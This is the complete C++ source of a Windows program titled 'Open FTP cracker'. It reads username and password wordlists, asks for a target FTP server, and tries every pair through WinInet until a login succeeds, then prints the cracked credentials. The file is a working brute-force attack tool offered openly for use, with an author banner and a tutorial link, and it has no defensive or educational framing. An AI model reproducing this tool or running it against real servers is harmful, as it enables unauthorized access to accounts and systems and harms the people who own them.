
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <fstream>
 
 
#pragma comment(lib, "Wininet")
 
 
int main()
{
 HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 SetConsoleTitle ( " Open FTP cracker coded by khalil kal " );
 ////////////////////////////////////////////////////////
  std::cout<< " .:*~*:._.:*~*:._.:*~*:.\n " <<std::endl;
  std::cout<< " .:  ftp_c++_cracker  :.\n " <<std::endl;
  std::cout<< " .:   by khalil kal   :.\n " <<std::endl;
  std::cout<< " .:*~*:._.:*~*:._.:*~*:.\n " <<std::endl;
  
  std::cout<< " using :-  https://www.youtube.com/watch?v=2htsaj8VoGg \n " <<std::endl;
 ////////////////////////////////////////////////////////
 
 std::string usernames = "", passwords = "", target = "", temp = "";
 
        HINTERNET hInternet = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
    if(!hInternet)
        {
        std::cout<<"Error starting WinInet, please close this application"<<std::endl;
        std::cin>>temp;
    return -1;
        }
 
       
        std::ifstream user_reader("usernames.txt");
        std::ifstream pass_reader("passwords.txt");
 
     if((!user_reader)||(!pass_reader))
     {
                 std::cout<<"Error opening one of the input files "<<std::endl;
                 std::cout<<"ensure \"usernames.txt\" and \"passwords.txt\" are in the same"<<std::endl;
                 std::cout<<"directory as this application, please close this application\n"<<std::endl;
         std::cin>>temp;
         return -1;
     }
 
         std::cout<<"target FTP server ? \n"<<std::endl;
         std::cin>>target;
   
 
     getline(user_reader,usernames);
 
   int attempts = 0;
   HINTERNET hFtpSession = NULL;
 
    while(!user_reader.eof())
     {
         SetConsoleTextAttribute(hConsole, 7);
      attempts++;
       
         
         getline(pass_reader,passwords);
                 std::cout<<"Trying username "+usernames+" with password "+passwords+" attempts "<<attempts<<" ";
 
            hFtpSession = InternetConnect(hInternet,target.c_str(),INTERNET_DEFAULT_FTP_PORT,usernames.c_str(),passwords.c_str(), INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE,0);
       
         if(!hFtpSession)
         {
                         SetConsoleTextAttribute(hConsole, 12);
                         std::cout<<"= FAIL"<<std::endl;
                         InternetCloseHandle(hFtpSession);     
         }
         else if(hFtpSession)
         {
                         SetConsoleTextAttribute(hConsole, 10);
                         std::cout<<"\n\nCracked "+target+"\nThe username is: \""+usernames+"\"\nPassword is: \""+passwords+"\""<<std::endl;
             InternetCloseHandle(hFtpSession);         
                         break;
         }
                 
         
 
         if(pass_reader.eof())
         {
         pass_reader.clear();
                 pass_reader.seekg(0,std::ios::beg);
         getline(user_reader,usernames);
         }    
    }  
       
   InternetCloseHandle(hInternet);     
   pass_reader.close();
   user_reader.close();
   std::cout<<"\nFinished, please close this application"<<std::endl;
   std::cin>>temp;
   return 0;
}

